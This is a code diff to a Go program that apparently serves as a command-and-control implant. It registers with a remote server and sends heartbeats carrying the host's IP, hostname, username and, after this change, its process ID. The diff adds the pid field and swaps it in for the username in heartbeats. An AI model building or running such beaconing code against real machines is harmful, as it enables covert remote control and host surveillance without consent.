@@ -19,6 +19,7 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -85,14 +86,15 @@ func firstContact() string {
 	}
 }
 
-func register(registerkey string, ip string, os_name string, user string) bool {
+func register(registerkey string, ip string, os_name string, user string, pid string) bool {
 	endpoint := URL + "/register"
 
 	var data = url.Values{
 		"registerkey": {registerkey},
 		"ip":          {ip},
 		"os":          {os_name},
-		"user":        {user}}
+		"user":        {user},
+		"pid":         {pid}}
 
 	jsonData, err := simplePost(endpoint, data)
 
@@ -108,13 +110,13 @@ func register(registerkey string, ip string, os_name string, user string) bool {
 	}
 }
 
-func heartbeat(registerkey string, ip string, user string) bool {
+func heartbeat(registerkey string, ip string, pid string) bool {
 	endpoint := URL + "/heartbeat"
 
 	var data = url.Values{
 		"registerkey": {registerkey},
 		"ip":          {ip},
-		"user":        {user}}
+		"pid":         {pid}}
 
 	jsonData, err := simplePost(endpoint, data)
 
@@ -243,6 +245,7 @@ func main() {
 	user, _ := user.Current()
 	os_name, _ := os.Hostname()
 	username := user.Username
+	pid := strconv.Itoa(os.Getpid())
 
 	registerkey = firstContact()
 	if strings.Contains(registerkey, "[-]") {
@@ -257,13 +260,13 @@ func main() {
 	}
 
 	//fmt.Println("[+] Registerkey = ", registerkey)
-	register_result := register(registerkey, ip, os_name, username)
+	register_result := register(registerkey, ip, os_name, username, pid)
 
 	// Register was not successful. Retry registering for 5 times again
 	if register_result == false {
 		for i := 1; i < 10; i++ {
 			registerkey = firstContact()
-			register_result := register(registerkey, ip, os_name, username)
+			register_result := register(registerkey, ip, os_name, username, pid)
 			if register_result == true {
 				break
 			}
@@ -273,12 +276,12 @@ func main() {
 
 	// Register was successful
 	for {
-		heartbeat_result := heartbeat(registerkey, ip, username)
+		heartbeat_result := heartbeat(registerkey, ip, pid)
 
 		// Heartbeat failed. Retry heartbeat.
 		if heartbeat_result == false {
 			for i := 1; i < 5; i++ {
-				heartbeat_result := heartbeat(registerkey, ip, username)
+				heartbeat_result := heartbeat(registerkey, ip, pid)
 				if heartbeat_result == true {
 					break
 				}
